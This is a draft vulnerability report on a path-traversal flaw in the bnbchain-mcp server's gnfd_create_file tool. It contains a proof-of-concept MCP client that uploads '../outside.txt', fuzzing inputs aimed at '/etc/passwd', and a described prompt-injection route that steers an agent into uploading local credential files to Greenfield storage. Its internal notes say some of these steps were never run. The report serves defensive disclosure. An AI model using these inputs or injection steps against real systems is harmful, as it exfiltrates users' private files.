# Unrestricted file path in `gnfd_create_file`: `filePath` can read and upload any file the server can access, including via `../`

**Repository:** `bnb-chain/bnbchain-mcp` · **Tool:** `gnfd_create_file` · **Tested commit:** `a133675`
**Weakness:** CWE-22 Path Traversal

## Summary
`gnfd_create_file` uploads a local file to a Greenfield bucket. `filePath` may be absolute or relative, and relative paths are resolved against the server's working directory with no containment, so `../` walks out of it. The file is read in full and sent to Greenfield storage. There is no configured upload directory and no allowlist, so a steered tool call can push any file the server process can read off the machine.

## Details
`src/gnfd/tools/storage.ts:40-63` at `a133675`:

```ts
      filePath: z
        .string()
        .describe(
          "Absolute path to the file to upload. The file must exist on the machine."
        ),
      ...
        const absoluteFilePath = path.isAbsolute(filePath)
          ? filePath
          : path.resolve(process.cwd(), filePath)

        const result = await services.createFile(network, {
          privateKey: privateKey as Hex,
          filePath: absoluteFilePath,
```

`src/gnfd/services/object.ts:35-45` then calls `statSync(filePath)` and `readFileSync(filePath)`, and `object.ts:126-137` uploads the content with `client.object.uploadObject`. The file is read before the private key is used, so a missing or invalid key still lets the read happen. The description asks for an absolute path, but relative paths are accepted and resolved. Nothing checks that the resolved path stays under any intended directory.

## Steps to reproduce
1. Prerequisites: Node.js 18 or later and Bun 1.2.10 or later. Step 4b needs a Greenfield testnet account with test BNB, passed to the server as `PRIVATE_KEY`. Step 4a needs no key. Create the marker file and an empty working directory:
   ```
   mkdir -p /tmp/tofu-poc/root && echo marker > /tmp/tofu-poc/outside.txt
   ```
2. Install and build the server:
   ```
   git clone https://github.com/bnb-chain/bnbchain-mcp.git
   cd bnbchain-mcp && git checkout a133675365d5d941d891b17a42f2ca587c33922a
   bun install && bun run build
   ```
   The client below starts `node dist/index.js` with `/tmp/tofu-poc/root` as its working directory.
3. Call the tool with these arguments:
   ```json
   {"network": "testnet", "filePath": "../outside.txt", "bucketName": "tofu-poc-bucket-1234"}
   ```

   ```python
   import asyncio
   import os
   from mcp import ClientSession, StdioServerParameters
   from mcp.client.stdio import stdio_client

   ARGS = {"network": "testnet", "filePath": "../outside.txt", "bucketName": "tofu-poc-bucket-1234"}

   async def main():
       server = StdioServerParameters(
           command="node",
           args=["/absolute/path/to/bnbchain-mcp/dist/index.js"],
           cwd="/tmp/tofu-poc/root",
           env={"PRIVATE_KEY": os.environ.get("GNFD_TESTNET_PRIVATE_KEY", "")},
       )
       async with stdio_client(server) as (read, write):
           async with ClientSession(read, write) as session:
               await session.initialize()
               result = await session.call_tool("gnfd_create_file", ARGS)
               print(result)
               if os.environ.get("GNFD_TESTNET_PRIVATE_KEY"):
                   print(await session.call_tool(
                       "gnfd_list_objects",
                       {"network": "testnet", "bucketName": ARGS["bucketName"]},
                   ))

   asyncio.run(main())
   ```
4. What to observe:
   - 4a, no key: with `filePath: "../missing.txt"` the error is `ENOENT: no such file or directory, stat '<...>/tofu-poc/missing.txt'`, a path outside the working directory. With `"../outside.txt"` the `ENOENT` is gone and the call fails later, at the private key step, because the file was found and read.
   - 4b, with a funded testnet key: the call returns `"status": "success"` with `objectName: "outside.txt"`, and `gnfd_list_objects` lists `outside.txt` in the bucket. Downloading it returns `marker`.

## Expected behavior
The tool should only upload files from a directory the operator configured, and reject any path that resolves outside it, including `../` sequences and symlinks. At minimum it should reject relative paths, as its own description asks for an absolute path.

## Actual behavior
Relative paths resolve against the working directory with no check, and the file is stat'ed and read. From the fuzzing run, `filePath: "../../../../<file>"` resolved four levels above the server's working directory:

```
Create file operation failed: Error: ENOENT: no such file or directory, stat '/home/<user>/<...>'
```

The run used an empty key, so no upload happened. The resolution outside the working directory is visible in the error.

## Impact
The LLM picks the tool arguments, and prompt injection in untrusted content (a web page, a document, another tool's output) can steer them. With a key configured, an injected instruction can make the agent upload a local file it should not touch, such as configuration or credential files, to Greenfield storage. `bucketName` is also caller-chosen, and `createBucket` (`src/gnfd/services/bucket.ts:35-39`) accepts any existing bucket name without checking who owns it. I did not test whether an upload into a bucket owned by someone else can succeed. The severity depends on the deployment: on a desktop setup the server can read most of the user's files.

## Suggested fix
- Add an upload root, for example a `GNFD_UPLOAD_ROOT` environment variable. Resolve `filePath` with `fs.realpathSync`, and reject it if `path.relative(root, resolved)` starts with `..` or is absolute.
- Reject relative paths, or resolve them against the upload root instead of `process.cwd()`.
- Consider the same preview-then-confirm flow the transfer tools use, so the user sees which local file will leave the machine before it is uploaded.

## Status on the default branch
Still present at `a133675` (2026-04-17). The tested commit is the head of the default branch.

## Prior reports
- #65 "Security Audit: Comprehensive Vulnerability Assessment — 8 Findings (1C, 2H, 3M, 2L)" (issue, open 2026-03-20): its finding SAR-02, "`gnfd_create_file` enables arbitrary local file exfiltration via Greenfield upload" (`src/gnfd/services/object.ts` lines 36-47, 52-154), is this bug. Only the summary table row is in the fetched text; the detailed SAR-02 section is past the 4000-character cut. No fix on the default branch: the code is unchanged at `a133675` (2026-04-17).
- #28 "Fix: Check file size before reading into memory" (PR, closed 2026-04-08): adds a `statSync` size check before `readFileSync` in the same upload path, against OOM; no path restriction.
- Documentation: README.md: "We do not recommend deploying this MCP Server on the public internet." (deployment warning about the unauthenticated SSE endpoint; nothing documents which local files may be uploaded, and there is no upload-directory setting)

<details>
<summary>Internal notes (remove before filing)</summary>

- DUPLICATE/FIXED CHECK: already reported as #65 finding SAR-02 (open, unfixed at `a133675`). Add the repro to #65 instead of opening a new issue.
- ToFu class / sanitizers: path-traversal via `check_path_traversal`, the only sanitizer that fired for this tool (silent-bug alert: the input was flagged and the tool returned normally).
- Campaigns and executions: corpus-sbx 512 exec / 445 ok (60 s); e2-0922 512 exec / 455 ok (60 s).
- Evidence (verbatim, trimmed): input `{'network': 'testnet', 'privateKey': '', 'filePath': '../../../../etc/passwd', 'bucketName': 'created-by-bnbchain-mcp'}` -> `"message": "Create file operation failed: Error: ENOENT: no such file or directory, stat '/home/mza6485/etc/passwd'"`. Other inputs: `'/etc/passwd\x00'` -> Node `ERR_INVALID_ARG_VALUE` (null byte), and a Windows-style `..\\..\\` path -> `ENOENT` inside the target dir. The draft's excerpt anonymises the user path.
- Hand-check hints: weak, largely by design. The tool's stated purpose is "upload any file on the machine by absolute path", so there is no intended directory to escape; the finding is really "no upload allowlist". The log never showed an existing out-of-tree file being read: the only out-of-tree path did not exist, and all runs had an empty key, so nothing was uploaded. The read-before-key ordering and the upload are from reading `object.ts:35-140`, not from a run. Step 4a's exact key error text is not verified (it comes from viem `privateKeyToAccount("")` thrown in `createBucket` at `bucket.ts:29`). Step 4b needs a funded Greenfield testnet account and was not run. Side observation: objects are created `VISIBILITY_TYPE_PRIVATE` (`object.ts:103`), while buckets the tool creates are `VISIBILITY_TYPE_PUBLIC_READ` (`bucket.ts:51`); the default bucket name `created-by-bnbchain-mcp` is global on Greenfield, so two users on defaults collide.
</details>
